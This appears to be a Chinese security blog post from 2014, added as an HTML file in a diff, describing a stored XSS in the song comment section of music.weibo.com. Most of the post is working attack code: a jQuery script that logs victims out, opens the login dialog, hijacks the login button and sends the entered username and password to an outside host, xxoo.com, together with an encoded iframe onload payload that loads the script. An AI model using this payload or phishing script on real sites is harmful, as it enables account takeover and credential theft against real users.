@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>记一次 div 层钓鱼 - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.4509a6b37e5a1523e05a614a994b1d27b8f97d6b6cc7b8732bfd105910856434.css" integrity="sha256-RQmms35aFSPgWmFKmUsdJ7j5fWtsx7hzK/0QWRCFZDQ=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>记一次 div 层钓鱼</h1>
+        <div>
+            <time datetime="2014-03-13 20:27:11 +0800 CST">发布时间: 2014-03-13 20:27</time>
+            <time datetime="2014-03-13 20:27:11 +0800 CST">更新时间: 2014-03-13 20:27</time>
+        </div>
+    </header>
+
+    <section>
+    <p><a href="http://music.weibo.com">http://music.weibo.com</a></p>
+<p>歌曲的歌评处过滤不严，只对 script 标签、http 进行了过滤，导致可通过标签的事件属性和编码进行绕过。 写了个 javascript 脚本进行 div 层钓鱼。
+基本流程如下：</p>
+<p><img src="div-phishing-1.png" alt=""></p>
+<p>js 代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fish</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;a&#34;</span>)[<span style="color:#ae81ff">20</span>].<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;\u9000\u51fa&#34;</span>) { <span style="color:#75715e">//判断是否登陆，若登陆则退出
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>(<span style="color:#e6db74">&#34;http://weibo.com/logout.php&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">reload</span>();
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;a&#34;</span>)[<span style="color:#ae81ff">7</span>].<span style="color:#a6e22e">click</span>();  <span style="color:#75715e">//触发登陆框
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#e6db74">&#34;getpass()&#34;</span>, <span style="color:#ae81ff">500</span>);   <span style="color:#75715e">//劫持登陆按钮
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    };
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getpass</span> () {   <span style="color:#75715e">//劫持登陆按钮
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;.W_btn_g&#34;</span>).<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;click&#34;</span>, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;.W_input&#34;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">value</span>;  <span style="color:#75715e">//用户名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">passwd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;.W_input&#34;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">value</span>;    <span style="color:#75715e">//密码
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">getScript</span>(<span style="color:#e6db74">&#34;http://xxoo.com/weibo_fish.php?username=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">username</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;password=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">passwd</span>);
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>; <span style="color:#75715e">//标记window.name ，防止重复
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">name</span><span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;ok&#34;</span>) {    <span style="color:#75715e">//检测window.name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fish</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>通过 <code>&lt;iframe onload=&quot;$.getScript('&amp;#104;ttp://xxoo.com/weibo_fish.js')&quot;&gt;&lt;/iframe&gt;</code> XSS。</p>
+<p>效果如下:</p>
+<p><img src="div-phishing-2.png" alt=""></p>
+<p><img src="div-phishing-3.jpg" alt=""></p>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
